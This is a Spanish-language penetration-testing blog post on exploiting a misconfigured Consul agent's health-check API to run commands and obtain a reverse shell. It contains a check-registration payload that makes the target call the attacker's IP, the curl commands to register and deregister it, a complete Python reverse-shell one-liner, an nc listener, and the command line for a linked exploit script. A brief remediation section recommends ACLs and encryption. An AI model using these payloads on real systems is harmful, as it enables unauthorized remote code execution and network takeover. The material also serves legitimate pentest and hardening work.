---
title: "Explotar Consul para obtener una reverse shell"
author: Adan Alvarez
classes: wide
excerpt: "Durante un test de penetración, uno de los objetivos más importantes son los equipos y programas de monitorización y configuración. Tomar el control de estos normalmente implica poder tener acceso a toda la red. En esta entrada veremos como una configuración incorrecta nos puede permitir explotar Consul para ejecutar código en los equipos que estén ejecutando el agente."
categories:
  - Herramientas
tags:
  - Red Team
  - Pentest
  - Reverse Shell
---
Durante un test de penetración, uno de los objetivos más importantes son los equipos y programas de monitorización y configuración. Tomar el control de estos normalmente implica poder tener acceso a toda la red. En esta entrada veremos como una configuración incorrecta nos puede permitir explotar Consul para ejecutar código en los equipos que estén ejecutando el agente.
{: style="text-align: justify;"}

[Consul](https://www.consul.io/) es una herramienta para el descubrimiento y configuración de servicios. Entre otras funcionalidades permite el descubrimiento de servicios, alertas sobre la salud de los clusters, almacenamiento de configuraciones dinámicas etc...
{: style="text-align: justify;"}

La funcionalidad que explotaremos en este caso es la de alertas del cluster. Los agentes de consul permiten crear [checks de salud mediante la API](https://www.consul.io/api/agent/check.html). Estos [checks](https://www.consul.io/docs/agent/checks.html) pueden ser de diferentes tipos, incluso pueden permitir la ejecución de scripts.
{: style="text-align: justify;"}

Verificando la ejecución de comandos
------------------------------------

Por defecto, los agentes de consul escuchan en el puerto 8500 y permiten peticiones HTTP. Durante un pentest, si descubrimos un puerto 8500 abierto será importante verificar si se trata de la API de consul. Para esto,  podemos realizar un simple: curl ip:8500 y la respuesta será Consul Agent.
{: style="text-align: justify;"}

[![](https://donttouchmy.net/wp-content/uploads/2018/11/curl_nmap-1-300x85.png)](https://donttouchmy.net/wp-content/uploads/2018/11/curl_nmap-1.png)

Si realmente es un Consul Agent podemos utilizar la función de checks para ejecutar código.  Podemos hacer una prueba creando un fichero con el siguiente contenido llamado payload.json:
{: style="text-align: justify;"}
```
{
"ID": "command",
"Name": "id",
"Args": ["curl", "IP_PROPIA"],
"Shell": "/bin/bash",
"Interval": "5s"
}
```
y ejecutando el siguiente curl para crear el check:
{: style="text-align: justify;"}
```
curl --request PUT --data @payload.json http://IP_VICTIMA:8500/v1/agent/check/register
```
Levantamos un servidor web con python y si funciona recibiremos una petición web del servidor en nuestra IP:
{: style="text-align: justify;"}

[![](https://donttouchmy.net/wp-content/uploads/2018/11/webserver-300x56.png)](https://donttouchmy.net/wp-content/uploads/2018/11/webserver.png)

Si queremos desregistrar el check podemos utilizar:
{: style="text-align: justify;"}
```
curl --request PUT http://IP_VICTIMA:8500/v1/agent/check/deregister/command
```
Explotar consul y obtener una reverse shell
-------------------------------------------

Si la ejecución de comandos funciona. El próximo paso puede ser explotar Consul para obtener una shell remota, para esto podemos utilizar python ejecutando:
{: style="text-align: justify;"}
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
Para facilitar la explotación podéis utilizar el siguiente script: [exploit-consul](https://github.com/adanalvarez/exploit-consul) que podéis encontrar también en nuestra sección de [herramientas](https://donttouchmy.net/herramientas/).
{: style="text-align: justify;"}

Para obtener una reverse shell primero utilizaremos el comando nc -lvp 4567 para esperar una conexión en el puerto 4567.
{: style="text-align: justify;"}

[![](https://donttouchmy.net/wp-content/uploads/2018/11/nc-1-300x65.png)](https://donttouchmy.net/wp-content/uploads/2018/11/nc-1.png)

Tras esto ejecutamos el script indicando la URL, nuestra IP y el puerto de escucha de nc:
{: style="text-align: justify;"}
```
python consul_exploit.py --url http://IP_VICTIMA:8500 --ip IP_PROPIA --port 4567
```
[![exploit consul](https://donttouchmy.net/wp-content/uploads/2018/11/python_exploit-300x16.png)](https://donttouchmy.net/wp-content/uploads/2018/11/python_exploit.png)

Al cabo de unos segundos recibiremos la reverse shell:
{: style="text-align: justify;"}

[![exploit consul](https://donttouchmy.net/wp-content/uploads/2018/11/nc_reverse-300x121.png)](https://donttouchmy.net/wp-content/uploads/2018/11/nc_reverse.png)

Remediación
-----------

Consul no opera en una configuración segura por defecto por lo que las diferentes configuraciones de seguridad deben ser activadas.
{: style="text-align: justify;"}

Consul se debe configurar para [usar ACLs](https://www.consul.io/docs/guides/acl.html#complete-acl-coverage-in-consul-0-8) con listas blancas para así solo permitir accesos mediante tokens válidos. Además se debe habilitar la opción de [cifrado de tráfico](https://www.consul.io/docs/agent/encryption.html) para evitar que las peticiones se envíen en texto plano.
{: style="text-align: justify;"}
